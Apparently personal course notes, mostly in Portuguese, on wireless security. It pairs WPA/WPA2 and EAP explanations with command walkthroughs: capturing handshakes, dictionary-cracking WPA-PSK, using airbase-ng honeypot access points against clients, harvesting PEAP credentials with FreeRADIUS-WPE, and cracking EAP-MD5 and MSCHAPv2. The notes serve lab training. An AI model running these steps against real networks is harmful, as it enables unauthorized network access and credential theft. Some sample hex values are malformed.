+- Targets an isolated client, allow association, waits for ARP packet like the Caffe Latte
+- Converts that into an ARP Request for the same client by relocating the IP address in the ARP header using fragmentation and patches ICV using Message Modification flaw
+- Client accepts packet sends replies
+- Game Over!
+
+wireshark &
+
+capture mon0
+
+filter: (wlan.fc.type_subtype == 0x20)
+
+airbase-ng -c 1 --essid how2security -W 1 -N mon0
+
+# outro terminal
+airodump-ng --channel 1 mon0 --write hirte
+
+# conecte seu cliente
+
+# outro terminal
+
+aircrack-ng hirte-01.cap
+
+Aula 20
+=======
+
+Understanding WPA/WPA2
+We need WEP's Replacement
+
+WPA PSK
+- Intermediate solution by Wi-Fi Alliance
+- Use TKIP
+	- Based on WEP
+- Hardware changes not required
+- Firmware update
+- Personal - PSK
+
+WPA Enterprise
+- Intermediate solution by Wi-Fi Alliance
+- Use TKIP
+	- Based on WEP
+- Hardware changes not required
+- Firmware update
+- 802.1X + RADIUS
+
+WPA2 PSK
+- Long term solution (802.11i)
+- Use CCMP
+	- Base on AES
+- Hardware changes required
+- Personal - PSK
+
+WPA2 Enterprise
+- Long term solution (802.11i)
+- Use CCMP
+	- Base on AES
+- Hardware changes required
+- 802.1X + RADIUS
+
+How does the Client Know?
+- Beacon Frames?
+- Probe Response Packets from the AP?
+Can be used to create a WPA/WPA2 Honeypot as well!
+
+# Configurar o AP WPA-Personal + WAP Only
+
+airodump-ng --channel 1 mon0
+^C
+
+# Configurar o AP WPA-Personal + WPA2 Only
+
+Analisa os pacotes no wireshark
+
+Aula 21
+=======
+WPA-PSK
+
+WPA: No static keys
+				  	    (((|)))
+				     	       |
+ +-----+				  +----+
+ | STA |				  |    |
+ +-----+ 				  | AP | 
+/      / 				  +----+
++-----+  Probe Request-Response			
+   | <-------------------------------------> |
+   | 	Authentication RR, Association RR    | 
+   | 					     | 
+   | 					     | 
+   | <--- Dynamic Key Generated First  ----> |
+   |					     |
+   | <- Data Encryption with Dynamic Key --> |
+   | 					     |
+   | 					     |
+   | 					     |
+
+WPA: Pre-Shared Key
+						  	    (((|)))
+						     	       |
+		 +-----+				  +----+
+		 | STA |				  |    |
+	  +--->	 +-----+ 				  | AP | 
+	 /	/      / 				  +----+
+	|	+-----+  			
+	|	   | 					     | - Password Based key derivation function
+	|	   | 					     | - RCF 2898
+	|	   | 					     | - PBKDF2 (Passphrase, SSID, ssidLen, 4096, 256)
+Pre-Shared Key 256b| 					     | - 4096 - Number of times the passphrase is hashed
+	^	   | 					     | - 256 - Intended key length of PSK
+	|	   |					     |
+      PBKDF2	   | 					     |
+	^	   | 					     |
+	|	   | 					     |
+       User	   | 					     |
+
+
+Lets "Shake Hands: 4-Way Handshake
+						  	    (((|)))
+						     	       |
+		 +-----+				  +----+
+		 | STA |				  |    |
+	  	 +-----+ 				  | AP | 
+	 	/      / 				  +----+
+		+-----+  Probe Request-Response			
+   		   | <-------------------------------------> |
+  		   | 	Authentication RR, Association RR    | 			
+	  +--------+-------+	   		    +--------+-------+
+	  | Pre-Share Key  | 			    | Pre-Share Key  |
+          +--------+-------+ 			    +--------+-------+ 
+		   | 					     | 
+		   | <-------------------- Message 1 ANounce | 
+	SNounce	   | 					     | 
+	        +--+---+	   		    	     |
+	        | PTK  | 			             |
+                +--+---+ 			    	     |
+      	 	   | 					     |
+		   | 					     |
+		   | 					     |
+       		   | 					     |
+
+
+
+airodump-ng --channel 1 mon0 --write wpa-psk-demo
+
+
+wireshark &
+
+capture mon0
+
+filter: (wlan.bssid == MAC_AP) && !(wlan.fc.type_subtype == 0x08)
+
+# conecte seu dispositivo
+
+# Verifique se houve o WPA handshake
+# pare o airodump-ng
+
+wireshark wpa-psk-demo-01.cap &
+filter: eapol
+
+# apenas 3 pacotes do handshake faltando um, pode fechar e vamos novamente
+
+airodump-ng --channel 1 mon0 --write wpa-psk-demo
+
+wireshark &
+
+capture mon0
+filter: eapol
+
+Key (msg 1/4) Message 1
+Key (msg 2/4) Message 2
+Key Message 3
+
+# conecte seu dispositivo
+
+Pairwise Transient Key
+- PTK = Function (PMP, ANounce, SNounce, Authentication MAC, Supplicant MAC)
+- PMK = Pre-Shared Key (Pairwise Master Key)
+- ANounce = Random by AP
+- SNounce = Random by Client
+- Authentication MAC = AP MAC
+- Supplicant MAC = Client MAC
+
+ 
+Lets "Shake Hands: 4-Way Handshake
+						  	    (((|)))
+						     	       |
+		 +-----+				  +----+
+		 | STA |				  |    |
+	  	 +-----+ 				  | AP | 
+	 	/      / 				  +----+
+		+-----+  Probe Request-Response			
+   		   | <-------------------------------------> |
+  		   | 	Authentication RR, Association RR    | 			
+	  +--------+-------+	   		    +--------+-------+
+	  | Pre-Share Key  | 			    | Pre-Share Key  |
+          +--------+-------+ 			    +--------+-------+ 
+		   | 					     | 
+		   | <-------------------- Message 1 ANounce | 
+	SNounce	   | 					     | 
+	        +--+---+	   		    	  +--+---+
+	        | PTK  | 			          | PTK  |
+                +--+---+ 			    	  +--+---+
+      	 	   | Message 2 SNounce + MIC --------------> |
+		   | 					     |
+		   | <----------- Message 3 Key Installation |
+       		   | 					     |
+       		   | 					     |
+       		   | Message 4 Key Instal ACK -------------> |
+       		   | 					     |
+
+Key
+802.1X Authentication
+ Key Information
+   1 = Install flag: Set
+
+Acknowledgements
+- IEEE Standard 802.11i - 2004
+
+
+I don't know -> Dunno the right phrase?
+						  	    (((|)))
+						     	       |
+		 +-----+				  +----+
+		 | STA |				  |    |
+	  	 +-----+ 				  | AP | 
+	 	/      / 				  +----+
+		+-----+  Probe Request-Response			
+   		   | <-------------------------------------> |
+  		   | 	Authentication RR, Association RR    | 			
+	  +--------+-------+	   		    +--------+-------+
+	  | Pre-Share Key  | 			    | Pre-Share Key  |
+          +--------+-------+ 			    +--------+-------+ 
+		   | 					     | 
+		   | <-------------------- Message 1 ANounce | 
+	SNounce	   | 					     | 
+	        +--+---+	   		    	  +--+---+
+	        | PTK  | 			          | PTK  |
+                +--+---+ 			    	  +--+---+
+      	 	   | Message 2 SNounce + MIC --------------> |
+		   | 					     |
+		   | <----------- Message 3 Key Installation |
+       		   | 					     |
+       		   | Message 2 SNounce + MIC --------------> | PTK is Derived MIC check failts
+       		   | 					     |
+       		   | <--------------------- DeAuthentication |
+       		   | 					     |
+
+# Faça o procedimento novamente reiniciando a captura
+capture mon0
+filter: (wlan.bssid == MAC_AP) && !(wlan.fc.type_subtype == 0x08)
+
+Key (msg 1/4) Message 1
+Key (msg 2/4) Message 2
+Key Message 3
+
+# conecte seu dispositivo
+
+Aula 22
+=======
+
+WPA Cracking
+
+
+Eavesdropping the 4 way handshake
+
+						  	    (((|)))
+						     	       |
+		 +-----+				  +----+
+		 | STA |				  |    |
+	  	 +-----+ 				  | AP | 
+	 	/      / 				  +----+
+		+-----+  Probe Request-Response			
+   		   | <-------------------------------------> |
+  		   | 	Authentication RR, Association RR    | 			
+	  +--------+-------+	   		    +--------+-------+
+	  | Pre-Share Key  | 			    | Pre-Share Key  |
+          +--------+-------+ 			    +--------+-------+ 
+		   | 					     | 
+		   | <-------------------- Message 1 ANounce | 
+	SNounce	   | 					     | 
+	        +--+---+	   		    	  +--+---+
+	        | PTK  | 			          | PTK  |
+                +--+---+ 			    	  +--+---+
+      	 	   | Message 2 SNounce + MIC --------------> |
+		   | 					     |
+		   | <----------- Message 3 Key Installation |
+      Key Install  | 					     |
+       		   | 					     |
+       		   | Message 4 Key Instal ACK -------------> |
+       		   | 					     |
+
+A Quick Block Diagram
+
+User --> Passphrase (8-63) --> PBKDF2 (SSID) --> Pre-Shared Key 256 bits --> 4 Way Handshake (SNounce, ANounce, AP MAC and Client MAC) --> Key PTK
+
+
+WPA-PSK Dictionary Attack
+
+Dictionary --> Passphrase (8-63) --> PBKDF2 (SSID) --> Pre-Shared Key 256 bits --> 4 Way Handshake --> KEY PTK --> Verify by Checking the MIC 
+
+Demo!
+
+airodump-ng --channel 1 mon0
+
+# Ache seu alvo
+
+airodump-ng --channel 1 --write how2sec-psk mon0
+
+# Aguarde aparecer o Handshake - para garantir que temos os 4 pacotes
+^C
+
+aircrack-ng how2sec-01.cap
+#	BSSID		ESSID		Encryption
+1	MAC_AP		how2sec		WPA (1 handshake)
+
+Index number of target network? 1
+
+Please specify a dictionary (option -w)
+
+echo qwertyui > dict
+echo 12345678 >> dict
+echo 12qw12qw >> dict
+
+aircrack-ng how2sec-01.cap -w dict
+#	BSSID		ESSID		Encryption
+1	MAC_AP		how2sec		WPA (1 handshake)
+
+Index number of target network? 1
+
+Passphrase not in dictionary
+
+echo allsafe_h2s >> dict
+
+aircrack-ng how2sec-psk-01.cap -w dict
+#	BSSID		ESSID		Encryption
+1	MAC_AP		how2sec		WPA (1 handshake)
+
+Index number of target network? 1
+
+KEY FOUND [ allsafe_h2s ]
+
+Master Key
+
+Transient Key
+
+EAPOL HMAC
+
+cowpatty
+
+cowpatty -f dict -r how2sec-psk-01.cap -s how2sec
+
+Which Packet Do we Need in the handshake?
+- All packets have he ap mac and client mac
+- ANonce
+	- Packet 1 and packet 3
+- SNonce
+	- Packet 2
+
+Answer: (Either All 4 packets), or (packet 1 and 2) or (packet 2 and 3)
+
+Decrypting WPA-PSK Traces
+- Wireshark
+- Airdecap-NG
+
+airdecap-ng -e how2security -p allsafe_h2s how2sec-psk-01.cap
+
+wireshark how2sec-psk-01-decap.cap &
+
+airdecap-ng -e how2security -p allsafe_h2s how2sec-psk-01.cap -b MAC_AP <-- descriptografa mais pacotes com a opção -b MAC_AP
+
+
+Aula 23
+=======
+WPA2-PSK Cracking
+Cracking WPA2-PSK
+- Same principles apply
+- As vulnerable as WPA-PSK is if a weak passphrase is chosen
+- Nothing extra to discuss
+
+Demo!
+
+# altere para WPA2 only
+
+airodump-ng --channel 1 mon0
+
+# Ache seu alvo
+
+airodump-ng --channel 1 --write how2sec-wpa2-psk mon0
+
+# Aguarde aparecer o Handshake - para garantir que temos os 4 pacotes - conecte seu dispositivo
+^C
+
+wireshark how2sec-wpa2-psk-01.cap &
+
+filter: eapol
+key (msg 1/4)
+key (msg 2/4)
+key (msg 3/4)
+key (msg 4/4)
+
+aircrack-ng how2sec-wpa2-01.cap
+#	BSSID		ESSID		Encryption
+1	MAC_AP		how2sec		WPA2 (1 handshake)
+
+Index number of target network? 1
+
+Please specify a dictionary (option -w)
+
+echo qwertyui > dict
+echo 12345678 >> dict
+echo 12qw12qw >> dict
+
+aircrack-ng how2sec-wpa2-01.cap -w dict
+#	BSSID		ESSID		Encryption
+1	MAC_AP		how2sec		WPA (1 handshake)
+
+Index number of target network? 1
+
+Passphrase not in dictionary
+
+echo allsafe_h2s >> dict
+
+aircrack-ng how2sec-psk-01.cap -w dict
+#	BSSID		ESSID		Encryption
+1	MAC_AP		how2sec		WPA (1 handshake)
+
+Index number of target network? 1
+
+KEY FOUND [ allsafe_h2s ]
+
+Master Key
+
+Transient Key
+
+EAPOL HMAC
+
+airdecap-ng -e how2security -p allsafe_h2s how2sec-wpa2-01.cap -b MAC_AP
+
+cowpatty
+
+cowpatty -f dict -r how2sec-psk-01.cap -s how2sec
+ 
+Aula 24
+=======
+WPA/WPA2-PSK Dictionary Attack
+
+PBKDF2
+- Requires SSID
+	- List of commonly used SSIDs
+- Requires Passphrase
+	- Can be provided from a dictionary
+- PMK can be pre-computed using the above
+
+Other Parameters in Key Cracking
+- SNonce, ANonce, Supplicant MAC, Authentication MAC, varies and hence cannot be "pre-calculated"
+- PTK will be different based on the above
+- MIC will be different as well
+
+Thus these cannot be pre-calculated in 
+
+Platforms
+- Multi-Cores
+- ATI-Stream
+- Nvidia CUDA
+- ...
+- In the Cloud
+	- Amazon EC2
+
+Fast Cracking Demo
+- Pyrit (google code)
+
+aircrack-ng -w dict how2sec-wpa2-01.cap
+
+genpmk -f dict -s how2sec -d Pre-Computed-PMKs
+
+cat dict
+
+cat Pre-Computed-PMKs
+
+cowpatty -d Pre-Computed-PMKs -s how2security how2sec-wpa2-01.cap
+
+pyrit
+
+pyrit -r how2sec-wpa2-01.cap analyze
+
+pyrit -r how2sec-wpa2-01.cap -i Pre-Computed-PMKs attack_cowpatty
+
+airolib-ng 
+
+airolib-ng PMK-Airolib --import cowpatty Pre-Computed-PMKs
+
+ls PMK-Airolib
+
+sqlite3 PMK-Airolib
+.help
+
+.tables
+
+select * from pmk;
+
+select * from essid;
+
+select * from password;
+
+.quit
+
+aircrack-ng -r PMK-Airolib how2sec-wpa2-01.cap
+1
+
+Aula 25
+=======
+Mood Swings of a Wandering Wi-Fi Client
+
+Stories of a Wandering Client
+- Multiple Profiles stored
+	- Open
+	- WEP
+	- WPA/WPA2
+- Tools don't work properly (WiFish Finder etc.)
+- But lets crack this from the basic principios
+
+Exploit All Possibilities
+- Need SSID with multiple configurations
+- We need to find the security settings first
+- We will fight the battle later
+
+airmon-ng start wlan0
+
+airodump-ng mon0
+
+airodump-ng --channel 1 mon0
+
+# conecte o dispositivio
+
+^C
+airodump-ng --channel 1 mon0
+
+# conecte o dispositivio e em outro terminal
+
+airmon-ng start wlan0
+airmon-ng start wlan0
+airmon-ng start wlan0
+airmon-ng start wlan0
+
+airmon-ng
+wlan0
+mon0
+mon1
+mon2
+mon3
+mon4
+
+airbase-ng
+
+airbase --essid how2sec -a AA:AA:AA:AA:AA:AA -c 1 mon1 <-- Open
+
+# outro terminal
+
+airbase-ng --essid how2sec -a BB:BB:BB:BB:BB:BB -c 1 -W 1 mon2 <-- WEP Shared Key
+
+# outro terminal -z --> 1=WEP40 2=TKIP 3=WRAP 4=CCMP 5=WEP104
+
+airbase-ng --essid how2sec -a CC:CC:CC:CC:CC:CC -c 1 -W 1 -z 2 mon3 <-- WPA-PSK
+
+# outro terminal
+
+airbase-ng --essid how2sec -a DD:DD:DD:DD:DD:DD -c 1 -W 1 -Z 4 mon4 <-- WPA2-PSK
+
+# pare o airodump-ng (observe os 4 FakeAPs) pegue o MAC_STA
+
+wireshark &
+
+capture mon0
+filter (wlan.addr == MAC_STA)
+
+airodump-ng mon0 --channel 1 --write honeypot
+
+# conecte com seu dispositivo - observe o 4 way handshake
+^C
+
+wireshark honeypot-01.cap &
+
+filter: eapol
+
+
+aircrack-ng -w dict honeypot-01.cap
+
+Aula 26
+=======
+Cracking WPA/WPA2-PSK with just client
+
+
+Stimulating a Handsjake
+
+						  	    (((|)))
+						     	       |
+		 +-----+				  +----+
+		 | STA |				  |    |
+	  	 +-----+ 				  | AP | 
+	 	/      / 				  +----+
+		+-----+  Probe Request-Response			
+   		   | <-------------------------------------> |
+  		   | 	Authentication RR, Association RR    | 			
+	  +--------+-------+	   		         +---+---+
+	  | Pre-Share Key  | 			         |   X   |
+          +--------+-------+ 			         +---+---+ 
+		   | 					     | 
+		   | <-------------------- Message 1 ANounce | 
+	SNounce	   | 					     | 
+	        +--+---+	   		 +-----------+---------------+
+	        | PTK  | 			 | WPA/WPA2 PSK DICT Attack  |
+                +--+---+ 			 +-----------+---------------+
+      	 	   | Message 2 SNounce + MIC --------------> |
+		   | 					     |
+		   | <----------- Message 3 Key Installation |
+      Key Install  | 					     |
+       		   | 					     |
+       		   | Message 4 Key Instal ACK -------------> |
+       		   | 					     |
+
+airodump-ng --channel 1 mon0
+
+# conect o dispositivo na rede real how2sec
+# agora vamos iniciar nosso FakeAPs
+
+# outro terminal
+airbase --essid how2sec -a AA:AA:AA:AA:AA:AA -c 1 mon1 <-- Open
+
+# outro terminal
+airbase-ng --essid how2sec -a BB:BB:BB:BB:BB:BB -c 1 -W 1 mon2 <-- WEP Shared Key
+
+# outro terminal -z --> 1=WEP40 2=TKIP 3=WRAP 4=CCMP 5=WEP104
+airbase-ng --essid how2sec -a CC:CC:CC:CC:CC:CC -c 1 -W 1 -z 2 mon3 <-- WPA-PSK
+
+# outro terminal
+airbase-ng --essid how2sec -a DD:DD:DD:DD:DD:DD -c 1 -W 1 -Z 4 mon4 <-- WPA2-PSK
+
+airodump-ng mon0 --channel 1 --write honeypot-wpa
+
+# reconecte o dispositivo
+
+aircrack-ng -w dict honeypor-wpa-01.cap
+
+1
+
+Aula 28
+=======
+
+WPA_Supplicante
+
+Connecting to WPA/WPA2 Networks
+- WPA_Supplicant is the de-facto tool
+- Supports tons of options
+- Cross Plataform
+	- Linux
+	- Windows
+	- OS X
+- Allow for better understanding of process
+- Open Source
+
+Confuiguration File Required
+- Samples available on the tool website
+- Best idea is to use available tamplates and customize
+
+http://w1.fi/wpa_supplicant/
+
+Supported WPA/IEEE 802.11i features
+
+    WPA-PSK ("WPA-Personal")
+    WPA with EAP (e.g., with RADIUS authentication server) ("WPA-Enterprise")
+    key management for CCMP, TKIP, WEP104, WEP40
+    WPA and full IEEE 802.11i/RSN/WPA2
+    RSN: PMKSA caching, pre-authentication
+    IEEE 802.11r
+    IEEE 802.11w
+    Wi-Fi Protected Setup (WPS)
+
+Supported EAP methods (IEEE 802.1X Supplicant)
+
+    EAP-TLS
+    EAP-PEAP/MSCHAPv2 (both PEAPv0 and PEAPv1)
+    EAP-PEAP/TLS (both PEAPv0 and PEAPv1)
+    EAP-PEAP/GTC (both PEAPv0 and PEAPv1)
+    EAP-PEAP/OTP (both PEAPv0 and PEAPv1)
+    EAP-PEAP/MD5-Challenge (both PEAPv0 and PEAPv1)
+    EAP-TTLS/EAP-MD5-Challenge
+    EAP-TTLS/EAP-GTC
+    EAP-TTLS/EAP-OTP
+    EAP-TTLS/EAP-MSCHAPv2
+    EAP-TTLS/EAP-TLS
+    EAP-TTLS/MSCHAPv2
+    EAP-TTLS/MSCHAP
+    EAP-TTLS/PAP
+    EAP-TTLS/CHAP
+    EAP-SIM
+    EAP-AKA
+    EAP-AKA'
+    EAP-PSK
+    EAP-FAST
+    EAP-PAX
+    EAP-SAKE
+    EAP-IKEv2
+    EAP-GPSK
+    LEAP (note: requires special support from the driver)
+
+Following methods are also supported, but since they do not generate keying material, they cannot be used with WPA or IEEE 802.1X WEP keying.
+
+    EAP-MD5-Challenge
+    EAP-MSCHAPv2
+    EAP-GTC
+    EAP-OTP
+    EAP-TNC (Trusted Network Connect; TNCC, IF-IMC, IF-T, IF-TNCCS)
+
+More information about EAP methods and interoperability testing is available in eap_testing.txt.
+Supported TLS/crypto libraries
+
+    OpenSSL (default)
+    GnuTLS
+
+Internal TLS/crypto implementation (optional)
+
+    can be used in place of an external TLS/crypto library
+    TLSv1
+    X.509 certificate processing
+    PKCS #1
+    ASN.1
+    RSA
+    bignum
+    minimal size (ca. 50 kB binary, parts of which are already needed for WPA; TLSv1/X.509/ASN.1/RSA/bignum parts are about 25 kB on x86)
+
+vi wpa-psk.conf
+
+# WPA-PSK/TKIP
+ctrl_interface=/var/run/wpa_supplicant
+
+network {
+	ssid="how2security"
+	key_mgmt=WPA-PSK
+	proto=WPA
+	pairwise=TKIP
+	group=TKIP
+	psk="abcdefabcd"
+}
+:wq
+
+ifconfig wlan0 up
+
+wpa_supplicant
+
+wpa_supplicant -Dwext -iwlan0 -c wpa-psk.conf
+
+wpa_supplicant -Dwext -iwlan0 -c wpa-psk.conf -dd
+
+wpa_supplicant -Dwext -iwlan0 -c wpa-psk.conf -dd -K -t
+
+dhclient3 wlan0
+
+
+Aula 29
+=======
+Setting up FreeRADIUS-WPE on BT5
+WPA-Enterprise
+- Use a RADIUS server for authentication
+- Different supported EAP Types - EAP-MD5, PEAP, EAP-TLS etc.
+- De facto server
+	- FreeRADIUS --> www.freeradius.org
+- Depending on EAP type used Client and Server will need to be configured
+
+FreeRADIUS-WPE
+- FreeRADIUS wireless Pwnage Edition
+- Created by Joshua and Brad
+- A patch to the FreeRADIUS code http://www.willhackforsushi.com/?page_id=37
+
+
+Network Architecture
+
+ARP Replay Step 1: Capture ARP Packets		(((|)))
+						   |
+  +-----+ <---------------------------------> +----+ 		    ------               _____
+  | STA |                                     | AP | 		   /      \ ___\     ___/    __\_      
+  +-----+ 		        	    +-|    |		  /-  ___  /    \/  /  /    /   \ _   
+ /      /  	 	       	   	    | +----+		 /     /           \__     //_     \_     
+ +-----+  	  		            |  			/   Internet         \   / ___       |      
+	       	   	        	    |			|           ___       \/+--/         /       
+	            		      	    |			 \__           \       \            /         
+		            		    v eth1	  +--->	   \__                 |          /
+	          		    	+------+	 /	        \     /____      /  /       |   	
+	      	  			| Free | -------´	       _____/         ___       \/  /\
+	      	  			|RADIUS| eth0		            \__      /      /    |    |
+	          			|      |		               \____/   \       /    /
+	      	  	        	|      |		                         -_-/\//-__-
+                  	 		+------+
+
+
+apt-get install libssl-dev
+
+cd /pentest/libs/freeradius-wpe
+
+ls
+
+./configure &&  make && make install
+
+
+# Acesso o access point
+Wireless Settings->Manual->WPA-Enterprise->WPA Only-> TKIP->EAP (802.1X) -> Authentication Timeout:60 -> RADIUS Server IP Address: 192.168.0.2->RADIUS Port:1812-> RADIUS Server Shared Secret:test->MAC Address Authentication:selected
+
+cd /pentest/libs/freeradius-wpe/rabbd/certs
+
+./bootstrap
+
+cp -r * /usr/local/etc/rabbd/certs/
+
+radiusd -s -X
+
+secret="test"
+shortname="testAP"
+
+# conect o cliente - username root password toor???
+
+Aula 30
+=======
+EAP-MD5 Basic and Demo
+
+
+
+						  	    (((|)))				+--------+
+						     	       |				|  Free  |
+		 +-----+				  +----+				| RADIUS |
+		 | STA |				  |    |				| Server |
+	  	 +-----+ 				  | AP | 				|	 |
+	 	/      / 				  +----+				+--------+
+		+-----+  			
+   		   | <---------------- EAP Request Identinty |					     |
+  		   | 					     | 					     |
+	  	   | EAP Response Identity ----------------> |	RADIUS Access Request -------------> |
+	  	   | 			         	     |					     |
+          	   | <------------ EAP Request MD5 Challenge | <------------ RADIUS Access Challenge |
+		   | 					     | 					     |
+		   | EAP Response MD5 Challenge -----------> | RADIUS Access Request --------------> |
+	  	   | 			         	     |					     |
+          	   | <--------------------------- EAP Sucess | <--------------- RADIUS Access Accept |
+
+Setting up the RADIUS Server
+- Add a username/password in userrs file
+- Make eap-md5 the default EAP type in eap.conf
+- Ensure the shared secret is correct for the AP-RADIUS server in clients.conf
+
+cp users users.original
+
+vim users
+
+how2security	Cleartext-Password := "Passwd12345"
+
+
+cp eap.conf eap.conf.original
+
+vi eap.conf
+
+eap {
+	default_eap_type = md5
+...
+:wq
+
+
+vi clients.conf
+
+client 192.168.0.0/16 {
+	secret		= test
+	shotname	= testAP
+}
+
+:wq
+
+Objective of Lab
+
+- Observer traffic on wired side between AP and RADIUS
+- Observer traffic on wireless side between Client and AP
+- Understand and correlate with the tls
+
+radiusd -s -X
+
+# outro terminal
+
+wireshark &
+
+capture eth1
+filter: eap
+
+airmon-ng start wlan0
+
+airodump-ng --channel 1 mon0
+
+wireshark &
+capture mon0
+filter: eap
+
+# conecte com o device
+
+# Pare os dois wireshark
+
+
+Aula 31
+=======
+
+Cracking EAP-MD5 with Eapmd5pass
+
+EAP-MD5
+- Cannot be used for Wi-Fi as does not support key generation
+- Does not support mutual authentication
+- Both plaintexxt challenge and response goes over the air unencrypted
+	- Attacker can obten both
+	- Launch a dictionary/educated bruteforce attack
+
+MD5 Mathemagic
+- Hash = MD5(EAP Response ID + Password + RADIUS Challenge)
+
+- Available to attacker:
+	- Hash
+	- RESPONSE id
+	- CHALLENGE
+- SIMPEL EQUATION
+	- KEEP GUESSING PASSWORD TILL THE HASH MATHEMATIC
+
+radiusd -s -X
+
+# outro terminal
+
+airodump-ng --channel 1 mon0
+
+wireshark &
+capture mon0
+filter: eap
+
+# conecta o cliente
+Para a captura e salve a captura: eap-md5-cracking.pcap
+
+eapmd5pass
+
+# outro terminal
+cd /pentest/wireless/NewTools
+./eapmd5crack.py
+
+/pentest/wireless/NewTools/eapmd5crack.py eap-md5-cracking.pcap wordlist.lst -v
+
+Y
+
+# outro terminal pegue os valores no wireshark
+
+PKT = Response, Identity = -U
+802.1X Authentication
+ Extensible Authentication Protocol
+  Identity: how2security
+
+PKT = Request, MD5-Challenge = -C
+802.1X Authentication
+ Extensible Authentication Protocol
+   value: 123dq3daimifmpifmpo4ofmp4gop4gmp4ogmpom5ph <-- Hex
+
+PKT = Response, MD5-Challenge = -R
+802.1X Authentication
+ Extensible Authentication Protocol
+   value: as53ad1e5faer8f4ae5f4a1er8tgr984gr84 <-- Hex
+
+PKT = Request, MD5-Challenge = -E
+802.1X Authentication
+ Extensible Authentication Protocol
+   Id: 102 <--
+
+eapmd5pass -U how2security -C 12:3d:q3:da:im:if:mp:if:mp:o4:of:mp:4g:op:4g:mp:4o:gm:po:m5:ph -R as:53:ad:1e:5f:ae:r8:f4:ae:5f:4a:1e:r8:tg:r9:84:gr:84 -E 102 -v -w dict
+
+User Password is "Passwd12345"
+
+cat dict
+Passwd12345
+
+# no terminal que estava executando eapmd5crack.py da uma olhada se ele encontro a senha
+
+Aula 32
+=======
+EAP Types and PEAP Demo
+
++-------------+------------------+
+| EAP Type    | Real World Usage |
++-------------+------------------+
+| PEAP        | Highest		 |
++-------------+------------------+
+| EAP-TTLS    | High		 |
++-------------+------------------+
+| EAP-TLS     | Medium		 |
++-------------+------------------+
+| LEAP        | Low		 |
++-------------+------------------+
+| EAP-FAST    | Low		 |
++-------------+------------------+
+
+PEAP
+- Protected Extensible Authentication Protocol
+- Typical usage:
+	- PEAPx0 with EAP-MSCHAPv2 (most popular)
+		- Native support on Windows
+	- PEAPv1 with EAP-GTC
+- Other uncommon ones
+	- PEAPv0/v1 with EAP-SIM (Cisco)
+- Uses Server Side Certificates for validation
+- PEAP-EAP-TLS
+	- Additionally uses Client side Certificates or Sm
+	- Supported only by Microsoft
+
+
+Ver figura na apresentação
+layer3.wordpress.com  -> https://layer3.wordpress.com/2009/08/16/eap-authentication-protocols/
+depois da uma olhada neste aqui https://layer3.wordpress.com/2009/10/17/lan-switch-security-%E2%80%93-detecting-dhcp-dos-attacks/
+
+
+EAP-TTLS
+- EAP-Tunneled Transport Layer Security
+- Server authenticates with Certificate
+- Client can optionally use Certificate as well
+- No Native support on Windows
+	- 3ª party utilities to be used
+- Versions
+	- EAP-TTLSv0
+	- EAP-TTLSv1
+
+EAP-TLS
+- Strongest security of all the EAPs out there
+- Mandates use of both server and client side certificates
+- Required to be supported to get a WPA/WPA2 logo on priduct
+- Unfortunately, this is not very popular due to deployment challenges
+
+Figura em https://layer3.wordpress.com/2009/08/16/eap-authentication-protocols/
+
+LEAP
+- Lightweight Extensible Authentication Protocol
+- Cisco proprietary
+- Almost obsolete now due to security issue - dictionary attacks
+	- Modified MSCHAP for authentication
+- Cisco recommends usage of EAP-FAST official LEAP replacement
+Figura em https://layer3.wordpress.com/2009/08/16/eap-authentication-protocols/
+
+EAP-FAST
+- Touted by Cisco as a replacement for LEAP
+- Server side certificates are optional
+- Uses protected access credential (PAC) to create TLS tunnel
+	- Provisioning can be manual/automated per user
+- Credenticals are exchanged over the TLS tunnel
+- Automatic PAC provisioning is susceptible to interception attack
+- A honeypot ap can be used by the attacker     the PAC and then bruteforce the MSCHAPv2   credentials supplied by the client
+
+Figura em https://layer3.wordpress.com/2009/08/16/eap-authentication-protocols/
+
+PEAP Reloaded
+- PEAP is the most popular enterprise Wi-Fi security mechanism used
+- We will setup PEAP using FreeRaduis-WPE and do a full authentication test
+- We will use OS X in this videos
+- Next we will explore the security risk using both Windows and OS X
+
+vi eap.conf
+
+
+eap {
+	default_eap_type = peap
+:wq
+
+radiusd -s -X
+
+configure  rede
+
+# outro terminal
+
+wireshark &
+
+captute mon0
+filter: eap
+
+wireshark &
+capture eth1
+filter eap
+
+# conecte com o dispositivo
+
+Aula 33
+=======
+Cracking PEAP
+
+Understanding the insecurity
+
+- Server side certificates
+	- Fake ones can be created
+	- Clients mmay not prompt or user may accept invalid certificates
+
+- Setup a honeypot with FreeRadius-WPE
+	- Cient connects
+	- Accepts fake certificate
+	- Sends authentication details over MSCHAPv2 in TLS tunnel
+	- Attacker's radius server logs the4se details
+	- Apply dictionary/reduced possibility bruteforce all Asleap by Joshua Wright
+
+
+tail -f /usr/local/var/log/radius/freeradius-server-wpe.log -n 0
+
+# outro terminal
+
+wireshark &
+capture eth1
+filter eap
+
+wireshark &
+capture mon0
+filter: eap
+
+# conecte o dispositivo
+
+# outro terminal 
+tail /WiFi/PEAP/darkc0de.lst
+qe
+qerw4t
+qrwtgtg
+wefwrrg
+wrgwtgw
+allsafe_h2s
+
+
+asleap -C a3:ee:23:sd:we -R 23:3d:gf:45:6y:ft:er:23:23 -W darkc0de.lst
+
+# no tail temos Challenge -C e Response -R e o -W aponta para uma wordlist
+
+# pega outro e e refaça o procedimento
+
+Aula 34
+=======
+Cracking PEAP in a Windows Network
+
+Windows PEAP Hacking Summed Up in 1 Slide =]
+
+Assistir novamente para fazer as configurações no Windows.
+
+tail -f /usr/local/var/log/radius/freeradius-server-wpe.log -n 0
+
+# outro terminal
+
+wireshark &
+capture eth1
+filter eap
+
+wireshark &
+capture mon0
+filter: eap
+
+# conecte o dispositivo
+
+# outro terminal 
+tail /WiFi/PEAP/darkc0de.lst
+qe
+qerw4t
+qrwtgtg
+wefwrrg
+wrgwtgw
+allsafe_h2s
+
+
+asleap -C a3:ee:23:sd:we -R 23:3d:gf:45:6y:ft:er:23:23 -W darkc0de.lst
+
+# no tail temos Challenge -C e Response -R e o -W aponta para uma wordlist
+
+# pega outro e e refaça o procedimento
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Aula 35
+=======
+Cracking EAP-TTLS
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
